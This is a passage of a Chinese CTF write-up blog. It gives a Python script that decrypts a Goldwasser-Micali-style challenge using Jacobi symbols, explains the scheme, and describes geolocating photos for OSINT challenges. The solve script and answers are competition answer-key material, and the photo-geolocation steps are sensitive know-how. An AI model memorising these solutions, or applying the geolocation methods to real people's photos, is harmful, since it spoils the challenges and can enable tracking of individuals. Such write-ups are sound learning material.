class="number">34759455078337466713687570837759299391145888134102277551962358024620758688171187801911667844577854548914263100454305449832301751244677050808326765573935</span>, <span class="number">62641568509833713711570997042380165235664835417880047834887119941106533946838625165485309542062874513558580937837811401775554996056276012858548810747347</span>, <span class="number">54194019664134441577306366078821449269779438459243001896266057182634402737447514629588811251761251129611153860195003472642962987782051611103708961485272</span>, <span class="number">9676719975605727589576567594806284175654511463346916758560517020880951689432081269100395625675818196925127997734215947176763303327133107063728652865092</span>, <span class="number">63566749489727772620392173241354690191479996208515013140899609482323018089891274628587945348053732850402777375616488219134732475021167536614183749124234</span>, <span class="number">41389623900588800459370336537971008333777146975023702675438708757749752963555785484099714125932669585301871871129676831310055260650788211828337348491635</span>, <span class="number">47917075128910721336524911506477538308166963835676033239879005679388922099453013708492602384789333571083037290234698623216184215279113464823730289467631</span>, <span class="number">42078396965923796292197567173986146390599180034726305403980989544300924488594853500670135297251227759567949453084387623824589172575028323672347374791941</span>, <span class="number">26303467325603478409681425746270561760458104487375750208136288587139525406524153947947748518132616711483856699835473508339705278736292600540239815382909</span>, <span class="number">70210903943912719585335197681971161149552376713285943471513533016171830587948389001752097220135466501852133147457131249134740746493652843424857558685008</span>, <span class="number">10982176703594503335099043190281003439554172817765519010960096427582643358491587999013894116717272583614348843361339369352126040302498012513340173620179</span>, <span class="number">15375296014322542477512079793365451835294548632729239177298243608312496055206983209051785207816356014706827464682118103802848458765231022530576526601610</span>, <span class="number">60741281657044949725279101097916718408759978002888427225701082044375050708404243485772424286061753927582296860956198565404203687044663002010199141883054</span>, <span class="number">51453860908549486935732242355904656953839434743576398315040968465095709554302378990788844834564479090576226704624193613651209306174501876260882175512600</span>, <span class="number">42121429843235634165003593566253812713226165431603117921955402685633741429269868521680013286432815656510584597940543612666107258425775935790786790012041</span>, <span class="number">75847336522995708598859507481988194486014177305660997189842728336432951513069707589487951184161881119260090343324285618931758405413108075158339567925903</span>, <span class="number">65758341817222621457885108916596158755098306658220921631792142654742204146490776266664280599781759820995333825069037428985525987702654906233411792587673</span>, <span class="number">15752213867601716547875293001866113163887582411052023985266075351056384315464535935735251239301973973233286836062255507777260674731895530600057333994665</span>, <span class="number">11151506009425616448244747739591250923500688700709156802826028410961247750111513167162557346776825044249732147604063296508981593009108961067551626395468</span>, <span class="number">24988307810903416422223700059042860807188507865378899213217629974481150832035797596850622418574087799771865200841087717335083639492611011968919584986991</span>, <span class="number">19188983999068145211485730840887302107035995560988908325822555747788727142296909943420991730736407232657762626482614632643567904876131676294106469080567</span>, <span class="number">49165807149291610078767263213011932229369890095374948339130583996779251886618924483782989424700910216292003196618943704463960760836284727712556416138720</span>, <span class="number">20880120825314766313470865125308572795577662008420147141189550790502101907656949439065273036601014525812307321695409142098153427350456159779924065995426</span>, <span class="number">3134148277638552172931615388909963243267631440500151801678408733633678460466625580372490623855596910321277808417815986593695645228186837564359773545208</span>, <span class="number">76027513376813747014021359611570577983815818102025816667258692296115385413227296619875774704856616068742697489757991264586446726640812185996619526500868</span>, <span class="number">9576386300219383458921907336704987148002255976652861754527672989041213499573772344464927344170160854134801169030299424714027104595802440175290118115467</span>, <span class="number">47846312343889535970416011840273559470023183338680746515101124658408961305018438134079804670804491884363672682872663103910308908246260073683029778116394</span>, <span class="number">16836020225895041283399865570278952563361372411312099179664436864693089583825672663104654006872379721154178277022850302378558639898531813871944866012688</span>, <span class="number">29312555443866353115375285797020858933593819317714753848974053207751144798790489316607442702651597786670972424273015577465723971183954317290632255518341</span>, <span class="number">45952399494660064838144555112298851928990690958591804048587523480566851679383669387866668507436863822348953169424458480096739821837326801953301622926562</span>, <span class="number">68334876517321835871217564446395717515355168304996149895652706727069147165281984411219162106481594608000995755151779899698717529318256390790021401438718</span>, <span class="number">25861029641666972527634309013968274542799402009868571607186682711883347548473260695668831750252078832274943353602464264720165568888925706728574087342628</span>, <span class="number">68551775088688184199771942195355426911668032674229430062997403726538379537067490978577329178497921291686561217843648566010918593439905810598612318905217</span>, <span class="number">37765025505682583464362211182398757603423382509025947521873112343726694702300573134890794527289002851767037029190171815999811136695377397688834815605025</span>, <span class="number">4249505767147772196031020651289585799937480050894276528897542147646240685440344617119239879135528543262687454500110733454342336571756916026373576137223</span>, <span class="number">12211897746552190684252135375038193571224731278828097646293011671737319460987527595630272305866452394238518927533887961137804982383129793243658322073814</span>, <span class="number">63672159925831702084608593770871378832840634765254242580922793878262780657303215300065343199745082617326364301567988188247544290658412323708309128521112</span>, <span class="number">5916152400097580259043801191542869219461022009826571612531294723654814844742388313101200734677007620911765056890963706507708736854388938954261090636816</span>, <span class="number">14317119988771636810566962078982667504680472212731015560163258949791136175315507709882234357375608038567842467558284485862323906865760782946330956519430</span>, <span class="number">73425426498763600363398477632846027187594993874507584521147927260063731277446622859480454490655597092173511066199697647323557539421105251159917461116448</span>, <span class="number">51291671008697812263954316353958818245358049801515013402923829127778604245127923912127853869137576703271789663513404617700625997281587078815337810294446</span>, <span class="number">16764552517838375964591874922821157969132749425046056275194064910709033826102499972685485237677710147299249213993545772193666719202717777304436525138230</span>, <span class="number">59295557012652744772208090497926508763666861380190571969243245501411454118387516963262188176132218639685609791422928694949362661989298405412386894959364</span>, <span class="number">65680239245306856298345111605806359497039862013602921288801762280364506136494777241063396949184533793043022857539147614816975238609243733604742559030417</span>, <span class="number">72375457889148576789811045675763717743813326782917792391377546702617598519587357238716263943784839291085690192526337648486979325162244907674119290503179</span>, <span class="number">53234077992007207968984629907955923807193864660771571665077871505422718966065301015318200429417886713035533081206849701294144524970607157018727881011421</span>, <span class="number">15886483931792974203050424700896494469022632750392566017940896092113020011301447115452279047200702841646809408874121286006915340993084644941811925011891</span>, <span class="number">4000026211601185502106663641762011708725430703734671920980073131891918285295081752549137630953921078183393375323131848411438504218653510143085517924354</span>, <span class="number">10319649624556731904039447425825069667183347360430256330142417710766254562223686734071109743956144803418154942873286729125709953817180715625501589162545</span>, <span class="number">2959127299070091142116584970101314098498259209023373122113534164489561723834616597754357457826712259811824721968019042637401460259286073863020743546081</span>, <span class="number">26966963187874068549615333973802158799875048269647561639319582873986161093336638373947258726531714616272425009280351155372607494769526061426271185799776</span>, <span class="number">60480379686940304504344210934804247883844503527104600258142856523953218645216216990403655911740533083627163777976245336274909972984546880202034729883312</span>, <span class="number">27261558287522575971851824442111090365144022873658966480485633047176320843612473205407488091205599851003730101551213929420057107039313052216522197198978</span>, <span class="number">5924889509968412055641812913053199966953595678605910723404383140816995621145232830288766243387119999521206867701900470658723204158233731531189957564758</span>, <span class="number">23453156796655450247116141307366623758418077565767073760208454382429546186654265548677867775354067560840816391896631759441083435660495001159025898492686</span>, <span class="number">76150503404358535746322203310861113340536545623277464771697476586798690077324876584398928162593218798780607052161166996099801460843556940059525992786824</span>, <span class="number">37727315876172847591393275092226735197131216415762771377741373327831827247473435512306043337156965991700136410696885151255831157825105690279082625332709</span>, <span class="number">34063446655575684287153287784734254171212485972386063875998727605151998698499957152558118780955043931859154057516779473847326673786233294077986859617690</span>, <span class="number">47483470590782205333078496439458525138609729122382072733999354756246820163015660201372672052476227811848001151006206216443241731573155888424535367176708</span>, <span class="number">39218420907233152349337503997750016372701524044569318259499048063748671531881474959351678569430809988119317210858114117053551093965393011243381378492998</span>, <span class="number">346813155305357896000101560296376715878805746572198412084124073507251650659757384260350199082220679479346402180280656007677537505603012072956567379200</span>, <span class="number">45220337350144137249456097166594787592336841735274298685371711994002352406886579127021444669722143416211134915968064654027096905338300592093107053708512</span>, <span class="number">5460012104494377033762803353668672910910932872167923235617032840897986334654385783555614999313086224242950388742840844011136027857375260879396677603020</span>, <span class="number">37023646144423321174994717117908019318650072460288262938875273128986672114185107589432972031304290211565654988060691997961153590815964538144365251181775</span>, <span class="number">63177477223445910049201384279690078930019819284264306067500875252847796215965700799007341759196250450491593055470958720571995993265879745352512656382848</span>, <span class="number">1700583012951649590611729034981286100342721588558142880964582566799910787514220066268682066981428229558226944161013518056229007812176089692828860741392</span>, <span class="number">17246038765173067313249878215359330957527587326662502645985291635246053470015915728537330740772303686721906455426913214534530261079901607192934039938060</span>, <span class="number">45987434147399996197496782026993298557958954570476732783848760609793549635871429620277069591160239426699116842877955529435739418658862835669098411826316</span>, <span class="number">21111490547303152987944854108036303223281643522396150653972569704379156697301910516727830184770144662770080107913540137717531007645289253745952440414926</span>, <span class="number">10698232879034106801260353759116257884533008949848502754162380992641437894367605208136298588395112435423177990947470598835570681171317007264887720823778</span>, <span class="number">54293643078851172364687836934990821579687484157127703064858191752204436487026179374856533544917557799042002597904530828982489891703237561281336459590518</span>, <span class="number">47797005580077273834483109591754793806985949961317398846769483505668568755603394284565164912646840149645763801903493468755606222509979288885436039797214</span>, <span class="number">37386506628153260384840150994124701181836200890809074083427785298815850467904026208990622829408207112968603273995655647351172691130659109869622941513399</span>, <span class="number">13057205711934046467118008739652612675758052758290552436105179764903448469199957925782089342100034435811618076856898039125384846873718510721165423899617</span>, <span class="number">18016141907808433145961025284467589788900284749942923516457310468709437001788966178751079198067783831673559463585356851811413814896939807067475555427374</span>, <span class="number">28185214541499079104899299096705844476508797918674889724218918359491538627046768060739267262641563085978395547302726213511677754065988144474006421669919</span>, <span class="number">8541173904106443905299905768662395072832935944800738204096451433781271007344649650999312461498262780266939438629628997360503524609987694055871540797822</span>, <span class="number">55583856938965878851727772532012615591107008734179599213849731144139750332990774963054496728870626955960023548737488241552231532876910895970717980723626</span>, <span class="number">73126878881701489711684528170287200941163894464677667890357697623803069282892472939945202511068349041064012766273020456331595582239718607715580058967921</span>, <span class="number">70354401173234203817094603858861728539350610438961386996586323986304956626309069628495646684906850309442426229300586236137286868518741887422968392162548</span>, <span class="number">8914284227759075166669843800606112854269465008336756701964119837078732698537791220276520358004294502231788167963298136537379442577658229609166991435663</span>, <span class="number">71679986255547965813146878140040664201073433340974131720089263707910307438689531571321153842267530643245284971416280923014280802420073531897677737784480</span>, <span class="number">12700447152069741878296970568845043035888752941098126195431952022535521184822464642258479573298459505834137899501751562570215414736024639835136989283837</span>, <span class="number">6343004739661668027332689782225036016497158024551360141260369562409298110062110418091776522944654709730459185916638767661342308594945318353078260927349</span>, <span class="number">63964337492108130229534104366403606549429509425838893610762333683602786560375188874744626561075352358482069214498737114463864688224040094143695973321979</span>, <span class="number">67331564851630274889744575564877053915024320348750381733860879963760029288286952415043130610380611202287853110449108590432736764101996881476127456612908</span>, <span class="number">53280882069162605530191514443798777810028687362597894103548425458220909107156582202503516464523795628658208894147158134959433009893999958404472326887421</span>, <span class="number">33987412638079761735126555460021225568819079582348419476130572631524190951142125555279430092745231216914642104268144970982726216308555881726629242470610</span>, <span class="number">13682406178752200853488921722342196537145987369704113476544421137346145516814433815172365070204243148827801660590665538792993163703633151871356444406959</span>, <span class="number">59463989125735016166555373271475329218895751331847622880739844997590477284788570075116983616019629056762256994818763091149753839468824722562416533043843</span>, <span class="number">67281682017361977913152739570150548267207777610917492408365814330418488902058223459045634717266171571439824557859718739925029610690419177548771060547694</span>, <span class="number">39405781498711220413739963695737002658793585701279503786490288662610492817823621117021234029885675098802400891723678776479565707731211683846374263316873</span>, <span class="number">53034807419358874766350432376315742395296988744022530785117462484846925513344688866349068005871824739673532913987445237461471468400241186927222857371834</span>, <span class="number">68305629722812234698423066134000790386970292527553321835797323301872488612831063496859128755927745930236100965836720379665554220277417403641562506589739</span>, <span class="number">15838477469714165090920618367681569358742354857430493842822269635842365646470133405526909343100727954425645887159301780057362634821410546797188280600973</span>, <span class="number">24406667934205773393486573213298175430629511700972743156092216312470305819697796258655710647669449052724920514990995515510027140733652668755162210879284</span>, <span class="number">68460243344752374579091832429666515661775987782765587913153602252111004705931127037248902092418367233502792799588802584226718845415421737479907804077611</span>, <span class="number">63808325950210035810812291635020630613732453561277058010602422073363230632345954950950233595453773160105621255639806986604615621453822332892789828462090</span>, <span class="number">35920729037346907063152399926080706264554331849560440381191227037937910244659464632447084476697840313861056020706495596126485303699013742182912707172975</span>, <span class="number">70315041903670157336851359766913844259670523706324294379204277248685999742047453561977925733597786796424146533733873673211660303409007875211743693703450</span>, <span class="number">39300531126860319955398345847761010603834225325535364925973189673883589019704883130648163179767141337507300067661030698253528221916592525918624340607537</span>, <span class="number">15496845894895615630021254140566466646250515307806313944390059489493636414202320808813409873352911875321240477276777125460299625425443517127346136060402</span>, <span class="number">6918931991334214049432302933214038877664252698312543806498810568265540530745938020106356587006559879317556154131091801485516823150639771462068552490458</span>, <span class="number">13284319826136226129231185037901985819553434334436034136363422696599972727231112997735289148332196516271619405264890626985179077260440615779761000533675</span>, <span class="number">47141354451986229521055621338816842478003758611988390046169176610982917702117914199406800715608779829266151978859414114993007913651989935003014956276172</span>, <span class="number">62006071231519162075067533854248673825540723340885150250907087023728863043449786611822047715700318722376817127112362733271740625676783440798426908449101</span>, <span class="number">63893521915695074076473015870298955838191664815517808757499000857893428891197252747360448837407785054229725838898014349928665255821170162098307539344307</span>, <span class="number">53724997828497244329408633732485843721280646497077186636538276560039817034467049143979659252524650609122526779152238242200009648428459318191364710668758</span>, <span class="number">59560026843867449601276263740933112576182129239752897447857785482266968806850863675639974741623809306675891510190099978299125663568621065833548636364530</span>, <span class="number">40908904103345585788262408080445592912077785202466130402193215696781356453887694866479723318713262095397682184771025397015406424244516593134998423540293</span>, <span class="number">21520846393831470685610096190168502256530920634386412660925756889910811879936477244071180593183278964080595838026896057947192168361175044065775753001472</span>, <span class="number">71994121934100897695373777005150806654834175335935905432800180220212844161938577456202364343367762384804519329089155317640274999082541777992495590496300</span>, <span class="number">59953753983754938792876611451670073996692753691715543251991783347838397186003557839758271745884505324101699352687982352675858568077550526416572161213218</span>, <span class="number">32018619708338154045357870379406367509414130390075786097563998491238705394761106321287493739342215745501191759206980684126857845949108887540197973688400</span>, <span class="number">19753200456167466465779432336842541030557413397596794468519345155114986012441764419115444925556673818310817249150486960437725537702448521078373504867565</span>, <span class="number">7342484858213250235462608889213386080064726860046853081716849206494415366815619844020076108010255128616757216474086252862052951751272920557333252010431</span>, <span class="number">4769896687715967889336481310203290840512712756999532930891000782787932528428270382724343267441239836234899104850512445829826485709802266593256527297538</span>, <span class="number">74355004258607576571833753840053548463378928267424658977196161874473156579212738683557688699040100682847094105589799689843205305201454653584801640872249</span>, <span class="number">6690892016551814532110082014788257179806167058472941857479165541743120455147037200870473223869330191373716321809815790713607069279076031653761661498152</span>, <span class="number">20929231349749029774507043474913656384295114733554322493333103320239789344142773690393384176681858129568549611334486303260091934120991115068065757099304</span>, <span class="number">17153283710807583417797086518064762512344132499163280505223698478090291002458606163847203257279411593037898263419480619904785414327965511942845045917778</span>, <span class="number">22050651142736213565244963818664170172032916896662073301155387192243089695489247087391670138735276225579775431936391388626697441900275744645141428022189</span>, <span class="number">50937819965132153811444565518964927860475724053299129557722050639198908074429589460667005191838429306196635373570825296681353003427220426130286971585939</span>, <span class="number">58913284462604187700172393158100310168635473835280983484905632522707627578956876728290392755044023467406825316230706821238436272638921714237556770859104</span>, <span class="number">17681890152946896225972804441881107507903984131878871289374213139906663030958773969339053682624067346901991714169068086996858271362082589139087115054292</span>, <span class="number">3909112468307243293324758000901176555871642123266849529594698077998545905775916220352604577315589652297068228906040474063596051918710761329690286227933</span>, <span class="number">26659357996912432362440742895222637274276390173496378252980802667664532931418023547469963558051869368670035728144595039473629042831713113176157537965085</span>, <span class="number">17179226767528485522234897181377818519983080414340110997618943993801738768695017677485273725010927951188829959293549597122347814093251802798150160484484</span>, <span class="number">19844433737083054737496998287597016986512276379827687999223100265664593048556212270024309974344283154237055912105437530884588065558856906602096195808242</span>, <span class="number">47348710551114046556019331306794334756808275356761888394461758029243482669094351826152778467123320068123601738366945029608823621120671776870709906375117</span>, <span class="number">9700117555541147957162539236799929299304670997996359585230076707723964209982089821563932293396563832179879999190357045199347391324979469059773776588627</span>, <span class="number">13467002873626636888949523271031927213159346608965094817646302401288661282610791478079736771259321566155237819209065435898148651759189622569101507485715</span>, <span class="number">63037961235817497070200076262785758477371602688561664152916441494722106004437031909053699035623597319059285567182742183641167584128065475289227729777632</span>, <span class="number">64218176089111895416869027246603819970664313506455920488148791215602497569336950361142384744880154632841827794749450034276833675991153288511197242689683</span>, <span class="number">47942263513439392830167504616104953960109996199015457630131745546068423701013642403323839156160826426619128873229034532556824671458723559069019818844664</span>, <span class="number">68742746222182563249219749720388662956433689017106697510006439927726538907944533506432387677351240369908865156490610628224604208935896518456792275951386</span>, <span class="number">52212644024277302202964993748543423030284246877586585223549426038195599560460361521694871178577347471545868137719848759593471592105056983977953734420504</span>, <span class="number">70264906652847626089535377366020042773837334827875270446429461263902560176829906570391678559378185295380703037786129287917380381287801134465465850277689</span>, <span class="number">70338735306991917918870792762895693400859231411804513011341248280823069527131025167916532212139891844804984508688078627963308722454289725189496741592783</span>, <span class="number">11202943024812091871968653090774694646166527588230230055019610642288376456094708642854597051283662781541220199344624011347563372208585467149576852176942</span>, <span class="number">45465287772079811194403031363838060966264660784435391586286323915162071710978408348641606715517047525841527692603591534466833484617776719296902254451809</span>, <span class="number">15169623996435078849216247400427343363968733516560810866651811037320678250903315110528158438221622688297331087485255287010416118126711779737721856328337</span>, <span class="number">28852475740061878372356478463808810042887244041514447822647154314012875742232208435189321135142249111535515768003337785061252044994754401654492928310569</span>, <span class="number">5964830405726355845868918682783030011195532635722675073707557787272120274893377363927170466481373691893436275201727030031846950955144759398184269785791</span>, <span class="number">34240000270864477532075102450968450839470355528222720094068701617005525747220229570079432765968261626445996576859553932062082807188947122110205121541573</span>, <span class="number">36066847009381278750262267643160682991490266290788266279454640758898653971700345576937422987472907571638424055138191448503121311206068403152358903727931</span>, <span class="number">11170091007234975852711136174576640764201643584673042209824904622333149479149743689621256091273212460852711241325787976935346940110932656520985022456280</span>, <span class="number">58258126945548764950797717782798700624779811959209396814323548509396126011391646953885580742437208484260400477925904686859314497837461751795642440123737</span>, <span class="number">19967926920673152856540078688569687894710262985783180877581399859282901459026334508029201347173518578230966148855216358303416030336039471203130056025847</span>, <span class="number">23595548276608645278366664833783341231551328905679099443768564892841143279319379101358803895431983463285466294746298308657854039318187145804362431897564</span>, <span class="number">2893474370961335486456525824174663168081310809497129676211358076233834398745859402822323873444488074719052580697214253881106450534065425461738291869558</span>, <span class="number">5958907829034425034060316070647535655459615550109982419322554756251664155034664518669276533235954875314578002477545778915463022354241496629192604779196</span>, <span class="number">27788566883685737903481747231933802166299928088919432671260904020088637407292302594730412087020004041723078159004193447947542516090218561430792231480922</span>, <span class="number">20532093112179185521013377866112742417812622082022290708449532178388359732865119787523382224112648787182208662206608003197496180647105678758158192400715</span>, <span class="number">53650577218203110600410729325998398766865814136267255360061172788801435890073996725463408842308335996720339673250282900111659334006005865543492882410994</span>, <span class="number">27945606735686322555814229684881151888663150442470178076013292048060839982203053567640973752973606459118462199368045579874974993094749585683152306114353</span>, <span class="number">7830111257927859573531774147894277110055421603464794311873488150838576658890506727221887391800809154699966290549716428882127868574637820957455771454946</span>, <span class="number">25025808677568131096842775102792540807686366181393166426022508716670220871341079639434019763537052343485081027257058743353860070591961282205809544500182</span>, <span class="number">5727554508299281734853143508379520041502848342636591640239397030993361937011007794354012913783223878938187192585041630893973877566528148234547516190549</span>, <span class="number">34125297955221973416857421179727086657998910466291260285578023763300602193457505573438526997539188005416829176125101756371491215872928342534317152560632</span>, <span class="number">32748794215539175827451064809169640707872656691637312790248785369034804895807371648792467471366168858175551862032815723885968389112394766296982682443669</span>, <span class="number">19316062337601046084359756740917069089224659580679757830844402882574641776835008814717493659219551992308545704093654161563862554123430967564362043544475</span>, <span class="number">16698150154757920977809280429499684949586664950572392192530208431996083807110717281687762672769576510155761079366746466550237192996169124113339334886230</span>, <span class="number">44572056955848609010373092439149356067260311771322096152721745227413956103682879244155534554941522431647827072846297085468860260003046353502705163208246</span>, <span class="number">27628575438344418993708339803452443890754069104828236665940305554239599902121186251891130374253429078333471004275298197440209461188118994332259999120164</span>, <span class="number">61919652562044972586438492785212427980643594673222454260723387039610192124396273187701658792233976764341751602543127060384407044689376048608848519817966</span>, <span class="number">46109764189688329101004508471171450628496264955374314980452086114935940284534425097345137553792317990951285615961627798248025371385228530104733124807466</span>, <span class="number">46817387909791035117400619877531601085593430973492709899023738884533565717056702943707383750398878694854456668238661907490893742791290178958747041681661</span>, <span class="number">59056224920609792204565568830061390745355488565348333616939229708289518825178885105132973296275188941665728400536826108349556934037483523802869792969716</span>, <span class="number">66604984921500741665478926723143420146438008068509389500728173853359052714091540238730324836724525809382581628360434354102848448924156047215001921555337</span>, <span class="number">31419582430779462840265313481263250807512794931203141071416250525469576085849479844947749880276719895647109269316672096266294357898786379072006529876864</span>, <span class="number">39183832730973061755201647330753616948134226115790320443363338294219451770753694348259167324654888119971382851094286357667963928230844906403886283289603</span>, <span class="number">3283255784320516413168899839829830028094602407822730101434806505467144706365783146560674309642101764920423301535255518747699612103072011492758793346946</span>, <span class="number">33368835974991525266725023131287562136839356113213003074639977323208007298803414289567135487257122997245456354564103035169531096968774429702946303497005</span>, <span class="number">69846025000402574364962470590372113840860535424086059210489025038699977139863035493677207474408680292062773766558077221180073317914557709977751070278701</span>, <span class="number">34224232632002355134365134629936005598177140616238858498314305970780852215452788902032135977405618831573456053924472889839514221495216331158722016210045</span>, <span class="number">65658980938469147193290995330802413952882415964793941700703938082218727023573782508973634540422819521500781964327919480012170455893980979452781727496450</span>, <span class="number">9665250348154536654206530131694515665172789483002642996612304591358982054881243090223340150894464762416439064809966191601896552757074713738589101038945</span>, <span class="number">8284215764601217981544785999422488229859061814390197195042613376491836774363916339272149964393696441572819237956327108891284365148450554717902579008885</span>, <span class="number">53839210761275384122812678155375624236213180995083637849090835596108532323779151952329262056317064448003166882964978836017773003455831766519615849734309</span>, <span class="number">8879066950085937295713426375145168962599389613745881844691288681084047755219605949515654929255916456463715160675759365433899307173061948451396093081300</span>, <span class="number">44846522954890932053452170548384737961090700275209642378685662035957105157761437451596217747093401844478988631729230318383327981353712362273424303455125</span>, <span class="number">43158163002980268176859470096906775042752252325756903267533186654149503438997066932081638361997913554233587761452222246607235427619695339583560854453989</span>, <span class="number">52573321691121279494123052995574692408510998007843795734096932344446198410817800561173257074232286807684589742033894643046244979672762218377487299434722</span>, <span class="number">7897550374384904887513967113216775000773764113952765407625043995683474308691357357102548770113514399030757334911738320038416173083084558400152128218597</span>, <span class="number">16715592176910978920444709654700402674087729403854503083620096481591569067609291105780994401753704255670785725498133269560763193450380953726654434098377</span>, <span class="number">13997295715451071253747239124428639199617619156231247326729836233417198543504118262938847989649348778500848314555687607052915438695191930013893628900615</span>, <span class="number">47229599794488613098124056349473823155280392998354765758670868622165063315177232324540165316843226647506443608478789352548001630604076040168618807914792</span>, <span class="number">35258213694320046701654200010884312588312321572105544777004280046591344354420706119915893205430664500593588418655204102873984500148524518893396701626955</span>]</span><br><span class="line"></span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">n = N</span><br><span class="line"><span class="keyword">for</span> cipher <span class="keyword">in</span> ct:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.jacobi(cipher, n) == -<span class="number">1</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(plaintext, <span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<p>所谓的同态加密，简单介绍下，从la佬学习过来</p>
<ul>
<li><p>密钥生成</p>
<p>和RSA一样，先选取两个大素数p和q，N=pq，z是N的二次非剩余中的一个随机数</p>
<p>pk=(N, z)，sk=(p, q)</p>
<p>何为<strong>二次非剩余</strong></p>
<ul>
<li>当存在某个X，$X^2\equiv d\ (mod\ p)$成立，称d是模p的二次剩余</li>
<li>当对任意的X，$X^2\equiv d\ (mod\ p)$不成立，称d是模p的二次非剩余</li>
</ul>
</li>
<li><p>加密</p>
<p>明文空间是{0, 1}</p>
<p>对于明文m，从取随机数$r\in \mathbb{Z}^*_N$，$c=r^2z^m\ mod\ n$</p>
</li>
<li><p>解密</p>
<p>对于密文c，如果c是模n的二次剩余，则m=0，否则为1</p>
</li>
</ul>
<p>为什么安全呢，从la佬拉来的话</p>
<p>GM加密系统的安全性是基于模n的二次剩余问题。对于私钥的拥有者，知道大整数n的因子分解，求解模n的二次剩余问题是容易的；而对于攻击者，无法获知n的因子分解，求解模n的二次剩余问题是困难的，继而保证了该加密方案的安全性</p>
<p>虽然我连n都分解不了，但是用雅克比可以做出来，雅克比是啥，后续补充</p>
<h1 id="Really-Awesome-CTF"><a href="#Really-Awesome-CTF" class="headerlink" title="Really Awesome CTF"></a>Really Awesome CTF</h1><p>没有密码学，又要被饿死了；所以手空看了下别方向的题目</p>
<p>OSINT(Open source intelligence)，公开来源情报，社工类的题目。这里有几题就是给一张照片，然后根据图上的信息，在比赛方提供的小地图上标出该照片拍摄的位置，应该要求精确度挺高的</p>
<h2 id="OSINT-Triangles"><a href="#OSINT-Triangles" class="headerlink" title="OSINT-Triangles"></a>OSINT-Triangles</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/25/e206b85e2467a1d7dda65e4954da58b1/triangles.jpg" alt="https://files-2021.ractf.co.uk/challenge-files/25/e206b85e2467a1d7dda65e4954da58b1/triangles.jpg"></p>
<p>主要的信息是一个广告牌和指路牌，首先定位是意大利的拉古萨，然后根据指路牌上的一些景点的名字找到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210816171347485.png" alt="Triangles"></p>
<h2 id="OSINT-Skyline（unsolved）"><a href="#OSINT-Skyline（unsolved）" class="headerlink" title="OSINT-Skyline（unsolved）"></a>OSINT-Skyline（unsolved）</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/26/360e01f9a6f43edfa5c83f0913e3653c/skyline.jpg" alt="Skyline"></p>
<p>没有文字信息有点难</p>
<p>好嘛，我按照wiki百科上所有的摩天轮列表依次找过去都无果，wiki百科上的应该也不完整</p>
<h2 id="OSINT-Silver-Darlings"><a href="#OSINT-Silver-Darlings" class="headerlink" title="OSINT-Silver Darlings"></a>OSINT-Silver Darlings</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/27/75b07a854ad678ce338f2ba0c384b913/silver_darlings.jpg" alt="Silver Darlings"></p>
<p>这道题有文字信息啊，而且是家知名的宾馆之类的吧，提取照片中的<code>Cafe de la Mairie</code>还有<code>Chambre dhôtes</code>等字样就能直接用搜索引擎搜到，位于法国</p>
<p>是不是都在欧洲啊</p>
<h2 id="OSINT-John-Poet"><a href="#OSINT-John-Poet" class="headerlink" title="OSINT-John Poet"></a>OSINT-John Poet</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/28/8209b216341b2ed208d10e8dc941d6fe/john_poet.jpg" alt="John Poet"></p>
<p>主要抓住R.H.C.（这不是红帽杯吗哈哈哈哈），一开始还以为是香水店，最后发现是酒店<code>Rail House Café</code></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210818133239653.png" alt="image-20210818133239653"></p>
<h2 id="OSINT-50m-on-the-Right（recuring）"><a href="#OSINT-50m-on-the-Right（recuring）" class="headerlink" title="OSINT-50m on the Right（recuring）"></a>OSINT-50m on the Right（recuring）</h2><p><img data-src="https://files-2021.ractf.co.uk/challenge-files/29/397b6b0a8d0d97fc25ff57c3ce082de6/50m_on_the_right.jpg" alt="50m on the Right"></p>
<p>翻译了几乎所有的文字的，但是搜索无果</p>
<p>先来看广告牌上的信息</p>
<ul>
<li><code>Bistrô</code>是葡萄牙语小酒馆的意思，并不是特定的店名</li>
<li>紧接着的两句话，上面一句是葡萄牙语<code>Cozinhar com Estilo,Saborear com Prazer</code>，在线翻译是<code>烹饪风格,愉快地品尝</code>，也对应下面英文的解释</li>
<li>接下来两个模块的字有点重影看不清</li>
<li>左下角是三个葡萄牙的电视：<code>sport tv,enfica tv,eleven sports</code></li>
<li>右下角好像是地图一样的东西，难道是临海的意思？</li>
</ul>
<p>然后再来看交通指示牌上面混合用着西班牙语，葡萄牙语以及加利西亚语，应该是某些禁止的意思，但没什么用</p>
<p>看到车牌<code>56-UZ-11</code>，查了一下葡萄牙的车牌符合此格式</p>
<p>所以综上应该是葡萄牙或者是葡萄牙上面的西班牙的加利西亚自治区</p>
<p>然后就没有然后了</p>
<p>评论区师傅提醒我了，竟然直接搜<code>葡萄牙 bistro 24</code>就有，这家餐馆的名字确实是叫<code>bistro 24</code>；当初我还以为是24小时营业的意思，还是不能放过细节。也确实该地在葡萄牙沿海</p>
<p>社工类题目的做法还得多训练下</p>
<h1 id="SSTF"><a href="#SSTF" class="headerlink" title="SSTF"></a>SSTF</h1><h2 id="Crypto-RSA101"><a href="#Crypto-RSA101" class="headerlink" title="Crypto-RSA101"></a>Crypto-RSA101</h2><p>开胃菜题，不会有<a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7!2256&authkey=!ANLCkvPBdXSb8Ko&em=2">tutorial</a></p>
